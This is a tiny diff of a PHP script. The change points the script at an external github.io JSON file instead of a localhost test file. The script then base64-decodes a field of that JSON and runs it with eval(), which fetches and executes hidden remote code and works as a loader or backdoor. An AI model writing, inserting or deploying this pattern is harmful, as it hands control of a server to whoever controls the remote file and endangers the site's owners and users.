@@ -1,5 +1,5 @@
 <?php
-$fi = file_get_contents('http://localhost/1-tools/test/file/json.php');
+$fi = file_get_contents('https://alexlogss.github.io/file/alex.json');
 $ob = json_decode($fi);
 $al = $ob->data;
 eval(base64_decode($al));
